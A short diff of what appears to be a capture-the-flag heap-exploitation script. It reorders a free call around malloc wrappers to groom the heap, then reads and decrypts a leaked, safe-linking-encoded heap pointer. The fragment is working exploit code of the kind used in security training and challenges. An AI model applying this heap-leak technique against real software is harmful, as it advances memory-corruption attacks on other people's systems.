@@ -75,12 +75,13 @@ def decrypt(cipher):
 print("malloc-ing")
 malloc(0, 1049) # malloc first big chunk
 malloc(1, 24)
+
+print("free-ing")
 free(0)
+
 malloc(2, 1070) # malloc slightly larger chunk
 malloc(3, 24)
 malloc(4, 24)
-print("free-ing")
-# free(0)
 
 encrypted_leak = readLeak(view(0))
 print(f"leak (encrypted): {hex(encrypted_leak)}")
